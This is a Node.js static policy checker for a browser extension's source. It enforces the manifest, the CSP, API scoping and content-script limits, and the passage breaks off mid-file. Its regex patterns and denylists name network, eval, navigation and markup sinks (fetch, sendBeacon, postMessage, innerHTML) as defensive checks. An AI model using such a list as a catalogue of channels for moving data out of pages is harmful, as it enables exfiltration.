#!/usr/bin/env node
// Static trust gate for extension/ (npm run check). Rules: .prd/02-architecture.md "Trust gate"
// and "Round 2 contract changes", widened for auto-fill by .prd/03-autofill.md ("Cross-unit
// contract"), tightened by MANIFEST_POLICY and the pattern lists below.
//
//   node scripts/check-policy.mjs                 # check ./extension
//   node scripts/check-policy.mjs --ext <dir>     # check another extension dir
//   node scripts/check-policy.mjs --self-test     # prove every rule catches its violation
//
// Prints one `PASS|FAIL <rule> <detail>` line per rule and exits 1 on any FAIL.
//
// What enforces what: extension pages cannot open network connections or load remote resources
// because of their CSP, which this gate requires to equal the approved policy exactly. CSP does
// not govern top-level navigation, so the gate additionally bans URL strings and navigation sinks
// (window.open, location assignment, links, forms and frames that leave the extension). Opening
// a tab or a window is left to one file, lib/nav.js, which opens only this extension's own popup
// views and is pinned by sha256; everywhere else chrome.windows is refused and chrome.tabs may
// only be read. Injecting into web pages (chrome.scripting) is left to lib/autofill-worker.js,
// through the chrome.scripting methods in MANIFEST_POLICY.scriptingMethods only (no CSS), and
// asking for, enumerating or giving up host access (chrome.permissions) to that worker and
// the popup's bind view. The content script that runs in web pages (lib/fieldfind.js and
// content/autofill.js) is not covered by the extension-page CSP; it is held to the same source
// rules as every other file and to a default-deny list of what it may touch (rule
// `content-script-sinks`: MANIFEST_POLICY.contentScriptFiles and the lists beside it), and the
// worker's script registration may name no other file. The worker's injected functions
// (injectedFunctions, run in the page by executeScript) are held to the same lists, each is one
// top-level declaration whose name nothing else in the file binds, assigns or shadows, and
// nothing else may be injected.
// The gate reads source text; it is a tripwire for the repository's own sources, not a
// JavaScript parser or a sandbox. The end-to-end test is what observes the pages a browser opens.

import { spawnSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const SCRIPT = fileURLToPath(import.meta.url);
const REPO_ROOT = path.resolve(path.dirname(SCRIPT), '..');

// ---- Manifest policy (v0.2) -------------------------------------------------------------------
// The one place that says what the manifest may ask for, how the extension may open tabs and
// windows, and which files may inject into pages or change host access. Widening it is a
// deliberate, reviewed change; v0.2 widened it for auto-fill (.prd/03-autofill.md) to exactly
// the committed manifest: two more permissions, optional https host access granted per site,
// and a module service worker.
// The self-test pins every value here against PINNED_POLICY, a copy written out by hand, so a
// change has to be made in both places.
const MANIFEST_POLICY = Object.freeze({
  // `permissions` must be a subset of this list.
  allowedPermissions: ['storage', 'activeTab', 'contextMenus', 'scripting'],
  // Must be absent or an empty array; a non-empty value fails the `permissions` rule.
  absentOrEmptyKeys: ['optional_permissions'],
  // `optional_host_permissions` must be present and hold exactly these patterns (no other, no
  // repeat); anything else fails the `permissions` rule. Nothing is granted at install: a site
  // gets access only when the user allows auto-fill for it and accepts the browser's prompt.
  optionalHostPermissions: ['https://*/*'],
  // `background` must be present and be exactly this object (no other key); anything else
  // fails the `background` rule.
  background: { service_worker: 'background.js', type: 'module' },
  // Must be absent; any value, even an empty one, fails the `manifest-keys` rule. The auto-fill
  // content script is registered at run time for bound sites only, never in the manifest.
  forbiddenKeys: [
    'host_permissions',
    'content_scripts',
    'externally_connectable',
    'update_url',
    'key',
    'web_accessible_resources',
    'sandbox',
    'declarative_net_request',
    'chrome_url_overrides',
    'oauth2',
  ],
  // `homepage_url` may be absent or exactly this.
  homepageUrl: 'https://github.com/2lab-ai/zauthenticator',
  // content_security_policy.extension_pages must equal this policy: the same directives with the
  // same source lists (order and case of directives and sources do not matter). No other
  // content_security_policy key is allowed.
  extensionPagesCsp:
    "default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data: blob:; connect-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'",
  // sha256 of extension/lib/nav.js, the only file that may open or change a tab or a window.
  navWrapperSha256: 'b0f323da96fc1cad5cbd0e15d64d7caf2c279bf29902c2a7112bd65fcb945822',
  // The chrome.tabs methods any other file may use; none of them opens, navigates or reloads a
  // tab. Every other chrome.tabs member (create, update, duplicate, goBack, goForward, reload,
  // ...) and all of chrome.windows fail the `navigation` rule outside lib/nav.js.
  tabsMethodsOutsideNav: ['getCurrent', 'captureVisibleTab'],
  // The only files (paths inside the extension) that may name chrome.scripting at all; any
  // reference elsewhere fails the `scripting-api` rule.
  scriptingFiles: ['lib/autofill-worker.js'],
  // The only chrome.scripting methods a scripting file may name: running an injected function
  // and keeping the content script's registration. insertCSS, removeCSS and every other member,
  // and chrome.scripting without a member (an alias, a computed access), fail the
  // `scripting-api` rule.
  scriptingMethods: [
    'executeScript', 'registerContentScripts', 'updateContentScripts', 'unregisterContentScripts',
    'getRegisteredContentScripts',
  ],
  // The only functions a scripting file may inject into a page (executeScript with func: <name>).
  // Each must be declared once, at the top level, as function <name>(...) { ... } in a scripting
  // file, and the name may appear nowhere else in the file but as the func: value in the options
  // literal of an executeScript call (no assignment, destructuring target, second binding or
  // shadowing parameter or local, which would make func: inject other code).
  // Its text is held to the content-script lists below, since it runs in the page as the content
  // script does. A scripting file may not name `files` or `css` at all (no files injected, no CSS
  // injected or registered), nor spell a computed key or member access with a string or template.
  injectedFunctions: ['fillFocused'],
  // The reads an injected function may make on top of the content-script lists, written as
  // <global>.<member> with the global named bare, and only as reads (a write fails): fillFocused
  // checks that the frame is still on the origin the menu was opened on before it writes.
  injectedReads: ['location.origin'],
  // Every chrome.scripting.executeScript( call takes one object literal written in the call, with
  // keys from this list only (func required; args may be shorthand), and its target: is an object
  // literal with keys from injectionTargetKeys: frames of one tab named by id, never allFrames,
  // documentIds or world. No variable, call result, import, spread or computed key.
  injectionKeys: ['target', 'func', 'args'],
  injectionTargetKeys: ['tabId', 'frameIds'],
  // registerContentScripts( and updateContentScripts( take one array literal of object literals
  // (or of a const holding one, declared once and used nowhere else) with keys from this list
  // only and a js: key: no world, matchOriginAsFallback, excludeMatches or css.
  registrationKeys: ['id', 'matches', 'js', 'allFrames', 'runAt', 'persistAcrossSessions'],
  // The only files that may use chrome.permissions freely: the worker (reconciles grants with
  // bindings, so it is what gives up a site's access once its binding is removed) and the popup's
  // bind view (asks for exactly one site, in the click on Allow).
  permissionsFiles: ['lib/autofill-worker.js', 'popup/popup.js'],
  // The chrome.permissions members any other file may use; none of them asks for, enumerates or
  // gives up access. request, remove, getAll, addHostAccessRequest, aliases and every other
  // member fail the `permissions-api` rule outside permissionsFiles.
  permissionsMembersAnywhere: ['contains', 'onAdded', 'onRemoved'],
  // The content script: the only files a script registration in scriptingFiles may name under
  // `js:`, injected in this order into every frame of a bound origin. They run in web pages,
  // outside the extension-page CSP, so the `content-script-sinks` rule holds them to the lists
  // below on top of the source rules every file meets.
  contentScriptFiles: ['lib/fieldfind.js', 'content/autofill.js'],
  // The only member names a content-script file may use after `.` or `?.`: reading the DOM and
  // the field descriptions it builds, setting `value`, dispatching events, a MutationObserver,
  // and array, string and set helpers (what the two files use), plus window/document listeners
  // with the page-state reads they make (visibilityState, hidden, persisted, readyState) and
  // getBoundingClientRect/getComputedStyle with the result fields that tell whether a field is
  // shown. Nothing that creates or inserts an element, writes src/href/srcset/action/data/poster/
  // background/style or markup, posts a message, or opens, submits or clicks anything; not
  // `attributes` either (setting an attribute node's value rewrites an existing src or href).
  // The injected fillFocused adds the focus reads it needs: activeElement, shadowRoot,
  // getRootNode and an input's type. content/autofill.js reads the worker's reply (code, and
  // validMs: how long the code stays valid), tells a filled field still in the page by
  // getRootNode, a user's edit of it by an input event's isTrusted, and the page's path by
  // document.URL (read-only; location.pathname would be writable and navigate).
  contentScriptMembers: [
    'activeElement', 'add', 'addEventListener', 'attrs', 'checkVisibility', 'code', 'disabled',
    'disconnect', 'dispatchEvent', 'display', 'every', 'filter', 'findInDocument', 'findIndex',
    'forEach', 'freeze', 'from', 'getAttribute', 'getBoundingClientRect', 'getClientRects',
    'getComputedStyle', 'getRootNode', 'group', 'has', 'height', 'hidden', 'includes', 'indexOf',
    'isArray', 'isTrusted', 'length', 'map', 'matches', 'maxLength', 'observe', 'parentElement',
    'persisted', 'push', 'querySelectorAll', 'readOnly', 'readyState', 'removeEventListener',
    'shadowRoot', 'some', 'split', 'test', 'toLowerCase', 'trim', 'type', 'URL', 'validMs', 'value',
    'visibility', 'visibilityState', 'visible', 'width', 'zauthFieldFind',
  ],
  // The only constructors a content-script file may call with `new`.
  contentScriptConstructors: ['Event', 'MutationObserver', 'Set', 'WeakSet'],
  // The only event types it may build (new Event('<type>', ...)) to dispatch on a filled field.
  contentScriptEvents: ['input', 'change'],
  // The only chrome APIs it may name: chrome.<area>.<member>.
  contentScriptChrome: ['runtime.sendMessage', 'runtime.id'],
});
const HOMEPAGE_URL = MANIFEST_POLICY.homepageUrl;
const NAV_WRAPPER = 'lib/nav.js';
const ALLOWED_FILE_EXTENSIONS = ['.json', '.js', '.html', '.css', '.png', '.LICENSE'];
const SUMS_PATH = 'vendor/SHA256SUMS';
const PNG_SIGNATURE = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
// Finder metadata never ships (scripts/build-zip.mjs excludes it), so it is not checked.
const IGNORED_NAMES = new Set(['.DS_Store']);

const NETWORK_PATTERNS = [
  ['fetch(', /\bfetch\s*\(/g],
  ['XMLHttpRequest', /\bXMLHttpRequest\b/g],
  ['WebSocket', /\bWebSocket\b/g],
  ['EventSource', /\bEventSource\b/g],
  ['sendBeacon', /\bsendBeacon\b/g],
  ['RTCPeerConnection', /\bRTCPeerConnection\b/g],
  ['webkitRTCPeerConnection', /\bwebkitRTCPeerConnection\b/g],
];
const DYNAMIC_CODE_PATTERNS = [
  ['eval(', /\beval\s*\(/g],
  ['new Function', /\bnew\s+Function\b/g],
  ['importScripts', /\bimportScripts\b/g],
  ['javascript: URL', /\bjavascript\s*:/gi],
  // setTimeout/setInterval whose first argument is a string or template literal.
  ['string timer', /\bset(?:Timeout|Interval)\s*\(\s*['"`]/g],
];
const URL_PATTERNS = [
  ['http://', /http:\/\//gi],
  ['https://', /https:\/\//gi],
];
// .css outside vendor/: nothing that loads from elsewhere. http(s):// anywhere also covers
// image-set("https://...") and similar string-taking functions.
const CSS_PATTERNS = [
  ['@import', /@import\b/gi],
  ['url( to http(s): or //', /\burl\(\s*['"]?\s*(?:https?:|[\\/]{2})/gi],
  ...URL_PATTERNS,
];
// Navigation sinks in .js/.html outside vendor/ that a regex can name. Bare open(...) calls,
// chrome.tabs/windows calls and links/forms are checked by navigationHits() below.
const NAVIGATION_PATTERNS = [
  ['window.open', /\b(?:window|self|globalThis)\s*(?:\?\.|\.)\s*open\b|\b(?:window|self|globalThis)\s*\[\s*['"`]open['"`]\s*\]/g],
  // location, location.href (and the other URL parts), document.location, window.location.
  // location.hash only moves within the page and is allowed.
  ['location assignment', /\blocation(?:\s*\.\s*(?:href|protocol|host|hostname|port|pathname|search))?\s*(?:=(?![=>])|\+=)/g],
  ['location.assign/replace', /\blocation\s*(?:\?\.|\.)\s*(?:assign|replace)\s*\(/g],
  ['setUninstallURL', /\bsetUninstallURL\b/g],
  // `chrome` used other than as chrome.<api> (an alias, destructuring, chrome['tabs']) would hide
  // which API is called, so it is refused everywhere, lib/nav.js included.
  ['chrome alias', /(?<![\w$])chrome(?![\w$])(?!\s*(?:\?\.|\.)\s*[A-Za-z_$])/g],
  ['<meta http-equiv=refresh>', /<meta\b[^>]*\bhttp-equiv\s*=\s*["']?\s*refresh/gi],
  // Not preceded by an identifier, so a JSDoc type such as Promise<object> is not an element.
  ['frame/embed/object element', /(?<![\w$])<(?:iframe|frame|frameset|embed|object|portal|fencedframe)\b/gi],
];
// open(<args>) as a call of the global, not a member call (x.open(...)), not a declaration.
const BARE_OPEN = /(?<![\w$.])(?<!\.\s+)(?<!\bfunction\s*\*?\s*)\bopen\s*(?:\?\.\s*)?\((?=\s*[^\s)])/g;
// chrome.tabs / chrome.windows (also with ?.), and the member that follows when there is one.
// No member means an alias or computed access (chrome.tabs['create'], const t = chrome.tabs).
const TABS_OR_WINDOWS = /(?<![\w$])chrome\s*(?:\?\.|\.)\s*(tabs|windows)(?![\w$])(?:\s*(?:\?\.|\.)\s*([A-Za-z_$][\w$]*))?/g;
// The same shape for the APIs that are scoped to a few files: chrome.scripting and
// chrome.permissions, with the member that follows when there is one.
const SCOPED_APIS = /(?<![\w$])chrome\s*(?:\?\.|\.)\s*(scripting|permissions)(?![\w$])(?:\s*(?:\?\.|\.)\s*([A-Za-z_$][\w$]*))?/g;
const FORBIDDEN_CSP_TOKENS = ["'unsafe-eval'", "'unsafe-inline'", "'wasm-unsafe-eval'"];

const RULES = [
  'extension-dir',
  'manifest',
  'permissions',
  'manifest-keys',
  'background',
  'homepage-url',
  'csp',
  'file-types',
  'network-api',
  'dynamic-code',
  'remote-url',
  'css-remote',
  'navigation',
  'nav-wrapper',
  'scripting-api',
  'permissions-api',
  'content-script-sinks',
  'inline-script',
  'locales-url',
  'vendor-sums',
  'vendor-license',
];

// cwd-relative when inside cwd, absolute otherwise.
function shownPath(p) {
  const rel = path.relative(process.cwd(), p);
  return rel === '' ? '.' : rel.startsWith('..') ? p : rel;
}

// Every entry under dir, depth-first, without following symlinks.
function walk(dir, rel = '') {
  const out = [];
  for (const name of fs.readdirSync(path.join(dir, rel)).sort()) {
    const relPath = rel ? `${rel}/${name}` : name;
    const abs = path.join(dir, relPath);
    const stat = fs.lstatSync(abs);
    if (stat.isDirectory()) out.push(...walk(dir, relPath));
    else out.push({ rel: relPath, abs, kind: stat.isFile() ? 'file' : stat.isSymbolicLink() ? 'symlink' : 'other' });
  }
  return out;
}

function lineOf(text, index) {
  return text.slice(0, index).split('\n').length;
}

function findAll(text, patterns, label) {
  const hits = [];
  for (const [name, re] of patterns) {
    re.lastIndex = 0;
    for (const m of text.matchAll(re)) hits.push(`${label}:${lineOf(text, m.index)} ${name}`);
  }
  return hits;
}

// CSP is ASCII: a browser splits a policy on ';' and its directives on ASCII whitespace only
// (tab, LF, FF, CR, space), and skips a directive that holds any non-ASCII character. JavaScript's
// trim() and \s also take U+00A0, U+2003, U+000B and more, so they must not be used here.
const CSP_WHITESPACE = /[\t\n\f\r ]+/;
const CSP_CHARACTER = /[^\t\n\f\r\x20-\x7e]/gu;

// One problem per distinct character outside printable ASCII and ASCII whitespace.
function cspCharacterProblems(policy) {
  const seen = new Map();
  for (const m of policy.matchAll(CSP_CHARACTER)) if (!seen.has(m[0])) seen.set(m[0], m.index);
  return [...seen].map(([ch, at]) => {
    const code = `U+${ch.codePointAt(0).toString(16).toUpperCase().padStart(4, '0')}`;
    return `character ${code} at offset ${at} (a CSP is printable ASCII separated by tab, LF, FF, CR or space)`;
  });
}

// → { directives: Map(name → sorted lower-case sources), duplicates: [name] }
function parseCsp(policy) {
  const directives = new Map();
  const duplicates = [];
  for (const part of policy.split(';')) {
    const tokens = part.split(CSP_WHITESPACE).filter(Boolean);
    if (tokens.length === 0) continue;
    const name = tokens[0].toLowerCase();
    // Browsers ignore every occurrence after the first; the approved policy has none.
    if (directives.has(name)) duplicates.push(name);
    else directives.set(name, tokens.slice(1).map((t) => t.toLowerCase()).sort());
  }
  return { directives, duplicates };
}

// Differences between a policy string and the approved one, [] when they are equal.
function cspDifferences(actualPolicy, approvedPolicy) {
  const actual = parseCsp(actualPolicy);
  const approved = parseCsp(approvedPolicy);
  const problems = [...cspCharacterProblems(actualPolicy), ...actual.duplicates.map((name) => `duplicate ${name} directive`)];
  for (const [name, want] of approved.directives) {
    const got = actual.directives.get(name);
    if (!got) problems.push(`${name} missing (approved: ${want.join(' ')})`);
    else if (got.join(' ') !== want.join(' ')) problems.push(`${name} is ${got.join(' ') || '(empty)'} (approved: ${want.join(' ')})`);
  }
  for (const name of actual.directives.keys()) {
    if (!approved.directives.has(name)) problems.push(`extra directive ${name} ${actual.directives.get(name).join(' ')}`.trim());
  }
  return problems;
}

function sha256Of(bytes) {
  return createHash('sha256').update(bytes).digest('hex');
}

function sha256(file) {
  return sha256Of(fs.readFileSync(file));
}

function inlineScriptHits(html, label) {
  const hits = [];
  for (const m of html.matchAll(/<script\b[^>]*>([\s\S]*?)<\/script\s*>/gi)) {
    if (m[1].trim() !== '') hits.push(`${label}:${lineOf(html, m.index)} inline <script> body`);
  }
  for (const m of html.matchAll(/<[a-zA-Z][^>]*>/g)) {
    const attr = m[0].match(/\s(on[a-z]+)\s*=/i);
    if (attr) hits.push(`${label}:${lineOf(html, m.index)} ${attr[1]}= attribute`);
  }
  return hits;
}

// Index of the quote that closes the string literal opened at `start`, or -1.
function stringEnd(text, start) {
  const quote = text[start];
  for (let i = start + 1; i < text.length; i += 1) {
    if (text[i] === '\\') i += 1;
    else if (text[i] === quote) return i;
    else if (quote !== '`' && text[i] === '\n') return -1;
  }
  return -1;
}

// For the '(' at `open`: { args: source text between the parentheses, end: index of ')' },
// or null when the call is not balanced. Skips string literals and comments.
function callArguments(text, open) {
  let depth = 0;
  for (let i = open; i < text.length; i += 1) {
    const c = text[i];
    if (c === '"' || c === "'" || c === '`') {
      i = stringEnd(text, i);
      if (i < 0) return null;
    } else if (c === '/' && text[i + 1] === '/') {
      i = text.indexOf('\n', i);
      if (i < 0) return null;
    } else if (c === '/' && text[i + 1] === '*') {
      i = text.indexOf('*/', i + 2);
      if (i < 0) return null;
      i += 1;
    } else if (c === '(') {
      depth += 1;
    } else if (c === ')') {
      depth -= 1;
      if (depth === 0) return { args: text.slice(open + 1, i), end: i };
    }
  }
  return null;
}

// An href that stays inside the extension: a fragment, or a relative path without a scheme or
// a leading // (which would leave the extension's origin). Character references are not
// decoded here, so any '&' is refused.
function isOwnHref(value) {
  const v = value.trim();
  if (v.startsWith('#')) return true;
  return !/^[a-z][a-z0-9+.-]*:/i.test(v) && !/^[\\/]{2}/.test(v) && !v.includes('&');
}

// `rel` is the file's path inside the extension; only lib/nav.js may open or change a tab.
function navigationHits(text, label, rel) {
  const hits = findAll(text, NAVIGATION_PATTERNS, label);

  BARE_OPEN.lastIndex = 0;
  for (const m of text.matchAll(BARE_OPEN)) {
    const call = callArguments(text, m.index + m[0].length - 1);
    // open(...) { ... } is a method definition, not a call.
    if (call && /^\s*\{/.test(text.slice(call.end + 1))) continue;
    hits.push(`${label}:${lineOf(text, m.index)} open( (global call)`);
  }

  // Not a call check: any reference to another member (const f = chrome.tabs.create) counts.
  if (rel !== NAV_WRAPPER) {
    for (const m of text.matchAll(TABS_OR_WINDOWS)) {
      const [, area, member] = m;
      const where = `${label}:${lineOf(text, m.index)}`;
      if (!member) hits.push(`${where} chrome.${area} used other than as chrome.${area}.<method> (alias or computed access)`);
      else if (area === 'windows' || !MANIFEST_POLICY.tabsMethodsOutsideNav.includes(member)) {
        hits.push(`${where} chrome.${area}.${member} outside ${NAV_WRAPPER} (open tabs with openOwnView)`);
      }
    }
  }

  // Links: no target, and an href only to the extension's own pages or a fragment.
  for (const m of text.matchAll(/(?<![\w$])<(a|area)\b([^>]*)>/gi)) {
    const [, tag, attrs] = m;
    const where = `${label}:${lineOf(text, m.index)}`;
    if (/(?:^|\s)target\s*=/i.test(attrs)) hits.push(`${where} <${tag} target=>`);
    const href = attrs.match(/(?:^|\s)href\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'=<>`]+))/i);
    if (href) {
      const value = href[1] ?? href[2] ?? href[3];
      if (!isOwnHref(value)) hits.push(`${where} <${tag} href=${JSON.stringify(value)}> leaves the extension`);
    }
  }
  // Forms: a form without action/target can only submit to its own page, which the approved
  // CSP's form-action 'none' blocks. action/target, and formaction/formtarget on a control,
  // point a submission somewhere else.
  for (const m of text.matchAll(/(?<![\w$])<form\b([^>]*)>/gi)) {
    const attr = m[1].match(/(?:^|\s)(action|target)\s*=/i);
    if (attr) hits.push(`${label}:${lineOf(text, m.index)} <form ${attr[1].toLowerCase()}=>`);
  }
  for (const m of text.matchAll(/<[a-zA-Z][^>]*>/g)) {
    const attr = m[0].match(/\s(form(?:action|target))\s*=/i);
    if (attr) hits.push(`${label}:${lineOf(text, m.index)} ${attr[1].toLowerCase()}= attribute`);
  }
  return hits;
}

// The global object, by the names it goes by in a page or a worker. Through it a file can reach
// chrome, and so any API the checks here read by its spelling, under a computed name
// (globalThis[c], Reflect.get(self, c), Object.values(window), const g = top; g[c]). So in every
// .js file each of these names may stand only as <name>.<member> (or <name>?.<member>), after a
// '.' as well (window.self[c], const g = window.window), and Reflect may not be named at all.
const GLOBAL_OBJECTS = ['globalThis', 'self', 'window', 'top', 'parent', 'frames', 'opener'];

// The one exception: a local of one of those names declared as a statement `const <name> = ...`
// (not var, not in a for header) may be read bare from its declaration to the end of the brace
// block that directly holds it (lib/fieldfind.js and lib/autofill-worker.js keep the parent
// element in `const parent`); a computed access on it still fails. A file the tokenizer cannot
// read is a hit, not a skipped file; an escape inside a string is not (this scan never reads a
// string's value), an escaped identifier is. → [hit] (rule `navigation`)
function globalObjectHits(text, label) {
  const { tokens, problems } = jsTokens(text, { escapes: true });
  const at = (tok) => `${label}:${lineOf(text, tok.i)}`;
  const hits = problems.map((p) => `${label}:${lineOf(text, p.i)} ${p.what} (the file cannot be read for global-object access)`);
  const closeOf = new Map(); // index of '{' -> index of its '}'
  const open = [];
  tokens.forEach((tok, k) => {
    if (isPunct(tok, '{')) open.push(k);
    else if (isPunct(tok, '}') && open.length) closeOf.set(open.pop(), k);
  });
  const locals = []; // [name, first token index, end token index]
  const enclosing = [];
  tokens.forEach((tok, k) => {
    if (isPunct(tok, '{')) enclosing.push(k);
    else if (isPunct(tok, '}')) enclosing.pop();
    else if (
      tok.t === 'id' &&
      GLOBAL_OBJECTS.includes(tok.v) &&
      tokens[k - 1]?.t === 'id' &&
      tokens[k - 1].v === 'const' &&
      !isPunct(tokens[k - 2], '(') &&
      isPunct(tokens[k + 1], '=')
    ) {
      const block = enclosing[enclosing.length - 1];
      locals.push([tok.v, k, block === undefined ? tokens.length : (closeOf.get(block) ?? tokens.length)]);
    }
  });
  tokens.forEach((tok, k) => {
    if (tok.t !== 'id') return;
    if (tok.v === 'Reflect') {
      hits.push(`${at(tok)} Reflect (it reaches an object's properties by computed names)`);
      return;
    }
    if (!GLOBAL_OBJECTS.includes(tok.v)) return;
    const next = tokens[k + 1];
    if (isDot(next) && tokens[k + 2]?.t === 'id') return;
    const dotted = isDot(tokens[k - 1]);
    const computed = isPunct(next, '[') || (isPunct(next, '?.') && isPunct(tokens[k + 2], '['));
    if (!dotted && !computed && locals.some(([name, from, to]) => name === tok.v && k >= from && k < to)) return;
    const shown = `${dotted ? '.' : ''}${tok.v}`;
    hits.push(`${at(tok)} ${shown} other than as ${shown}.<member> (${computed ? 'a computed access on the global object' : 'the global object as a value'} reaches chrome and every API by a computed name)`);
  });
  return hits;
}

// chrome.scripting outside MANIFEST_POLICY.scriptingFiles, and chrome.permissions outside
// MANIFEST_POLICY.permissionsFiles other than the members in permissionsMembersAnywhere.
// Like the chrome.tabs check, any reference counts, not only a call, and a reference without a
// member (an alias, a computed access) is refused. Inside scriptingFiles only the methods in
// scriptingMethods may be named, checked twice: on the raw text (comments included; the worker's
// `/` guess cannot hide a member there), and on the file's tokens, which also see a member split
// off by a comment (chrome.scripting /* x */ .insertCSS) and refuse chrome.scripting without a
// member (a comment that mentions chrome.scripting does not count there).
// → { scripting: [hit], permissions: [hit] }
function scopedApiHits(text, label, rel) {
  const hits = { scripting: [], permissions: [] };
  const { scriptingFiles, scriptingMethods } = MANIFEST_POLICY;
  const notPinned = (where, member) => `${where} chrome.scripting.${member} is not one of scriptingMethods (${scriptingMethods.join(', ')})`;
  SCOPED_APIS.lastIndex = 0;
  for (const m of text.matchAll(SCOPED_APIS)) {
    const [, area, member] = m;
    const where = `${label}:${lineOf(text, m.index)}`;
    const shown = member ? `chrome.${area}.${member}` : `chrome.${area} (alias or computed access)`;
    if (area === 'scripting') {
      if (!scriptingFiles.includes(rel)) hits.scripting.push(`${where} ${shown} outside ${scriptingFiles.join(', ')}`);
      else if (member && !scriptingMethods.includes(member)) hits.scripting.push(notPinned(where, member));
    } else if (!MANIFEST_POLICY.permissionsFiles.includes(rel) && !(member && MANIFEST_POLICY.permissionsMembersAnywhere.includes(member))) {
      hits.permissions.push(`${where} ${shown} outside ${MANIFEST_POLICY.permissionsFiles.join(', ')}`);
    }
  }
  if (scriptingFiles.includes(rel)) {
    const { tokens } = jsTokens(text);
    tokens.forEach((tok, k) => {
      if (tok.t !== 'id' || tok.v !== 'chrome' || !isDot(tokens[k + 1]) || tokens[k + 2]?.v !== 'scripting' || tokens[k + 2].t !== 'id') return;
      const where = `${label}:${lineOf(text, tok.i)}`;
      const member = isDot(tokens[k + 3]) && tokens[k + 4]?.t === 'id' ? tokens[k + 4].v : null;
      if (!member) hits.scripting.push(`${where} chrome.scripting used other than as chrome.scripting.<method> (alias or computed access)`);
      else if (!scriptingMethods.includes(member)) hits.scripting.push(notPinned(where, member));
    });
    // A member both scans see is reported once.
    hits.scripting = [...new Set(hits.scripting)];
  }
  return hits;
}

// ---- Content scripts ----------------------------------------------------------------------------
// The files in MANIFEST_POLICY.contentScriptFiles run inside web pages, where the extension-page
// CSP does not apply: a resource they make the page load, or a message they post, leaves from the
// page. Besides the source rules every file meets, they are held to a default-deny list (rule
// `content-script-sinks`): every member name after `.` or `?.` must be in contentScriptMembers,
// every `new` must build one of contentScriptConstructors (an Event only of contentScriptEvents),
// and `chrome` may appear only as chrome.<one of contentScriptChrome>. Computed member access with
// a string key, computed calls, writes to a computed member (except into a const {} the file made
// and binds nowhere else), object destructuring patterns, escaped identifiers, the bare globals in
// BARE_CONTENT_SINKS, timers whose first argument is not a function, and strings that name a URL
// sink are refused as well. The same checks apply to the text of each injected function, which
// may also read what MANIFEST_POLICY.injectedReads lists (passed in as `reads`).
// postMessage is refused in every form: the script runs in every frame of a bound origin, and the
// frame's parent, top or opener may be another site, while the page itself already gets the code
// through the field. window.name is refused for the same reason (it survives navigation to another
// site). Globals are a denylist rather than an allowlist because a text scan cannot tell a free
// global from a local of the same name (fieldfind.js has locals `name` and `parent`).

// Bare identifiers a content script may not name at all (as members they fail the member list).
const BARE_CONTENT_SINKS = [
  'fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource', 'RTCPeerConnection', 'webkitRTCPeerConnection',
  'importScripts', 'import', 'eval', 'Function', 'postMessage', 'open', 'Image', 'Audio', 'Worker',
  'SharedWorker', 'FontFace', 'with',
];
// String values (compared trimmed, case-insensitively) that name a URL-taking attribute or a markup
// or loading API: with them a computed key or a reflection call reaches the sink by another name.
const CONTENT_SINK_STRINGS = [
  'src', 'srcset', 'imagesrcset', 'href', 'xlink:href', 'action', 'formaction', 'data', 'poster',
  'background', 'srcdoc', 'ping', 'codebase', 'archive', 'longdesc', 'lowsrc', 'innerhtml',
  'outerhtml', 'insertadjacenthtml', 'csstext', 'backgroundimage', 'setattribute', 'setattributens',
  'createelement', 'createelementns', 'write', 'writeln', 'postmessage', 'sendbeacon', 'open',
];
const TIMERS = ['setTimeout', 'setInterval'];
const ASSIGNMENT_OPS = new Set(['=', '+=', '-=', '*=', '/=', '%=', '**=', '<<=', '>>=', '>>>=', '&=', '|=', '^=', '&&=', '||=', '??=']);
// Keywords after which an expression starts: a '/' there opens a regular expression and a '['
// an array literal.
const EXPRESSION_KEYWORDS = new Set(['return', 'typeof', 'instanceof', 'in', 'of', 'new', 'delete', 'void', 'throw', 'case', 'do', 'else', 'yield', 'await', 'extends']);
const NOT_COMPUTED_AFTER = new Set([...EXPRESSION_KEYWORDS, 'const', 'let', 'var']);
const PUNCTUATORS = ['>>>=', '...', '===', '!==', '**=', '<<=', '>>=', '>>>', '&&=', '||=', '??=', '=>', '==', '!=', '<=', '>=', '&&', '||', '??', '?.', '++', '--', '+=', '-=', '*=', '/=', '%=', '&=', '|=', '^=', '**', '<<', '>>'];
const LINE_END = /[\n\r\u2028\u2029]/;
const NUMBER = /0[xXbBoO][\da-fA-F_]+n?|\d[\d_]*\.?[\d_]*(?:[eE][+-]?\d+)?n?|\.\d[\d_]*(?:[eE][+-]?\d+)?/y;
const SIMPLE_ESCAPES = { n: '\n', t: '\t', r: '\r', b: '\b', f: '\f', v: '\v' };

// The body of a string literal (quote at `start`) or of a template part (`start` just after the
// backtick or the '}' that closes a substitution), with simple escapes decoded. With `escapes`,
// \x, \u and octal escapes are kept as written instead of refused (for a scan that never
// compares a string's value). → { end: index after it, value, open: ended at '${' } or { problem }
function readQuoted(text, start, quote, escapes = false) {
  let value = '';
  for (let i = quote === '`' ? start : start + 1; i < text.length; i += 1) {
    const c = text[i];
    if (c === quote) return { end: i + 1, value, open: false };
    if (quote === '`' && c === '$' && text[i + 1] === '{') return { end: i + 2, value, open: true };
    if (quote !== '`' && (c === '\n' || c === '\r')) break;
    if (c !== '\\') {
      value += c;
      continue;
    }
    const n = text[i + 1] ?? '';
    // \x, \u and octal escapes spell a character by number; a scan that compares names cannot
    // follow them, so they are refused (write the character itself).
    if (/[xu0-9]/.test(n) && !escapes) return { problem: `escape \\${n} in a ${quote === '`' ? 'template' : 'string'} literal` };
    if (n === '\r' && text[i + 2] === '\n') i += 1;
    else if (!LINE_END.test(n)) value += SIMPLE_ESCAPES[n] ?? n;
    i += 1;
  }
  return { problem: `unterminated ${quote === '`' ? 'template' : 'string'} literal` };
}

// Index just after the regular expression literal at `start` (its opening '/'), or -1.
function regexEnd(text, start) {
  let inClass = false;
  for (let i = start + 1; i < text.length; i += 1) {
    const c = text[i];
    if (LINE_END.test(c)) return -1;
    if (c === '\\') i += 1;
    else if (c === '[') inClass = true;
    else if (c === ']') inClass = false;
    else if (c === '/' && !inClass) {
      let e = i + 1;
      while (e < text.length && /[\w$]/.test(text[e])) e += 1;
      return e;
    }
  }
  return -1;
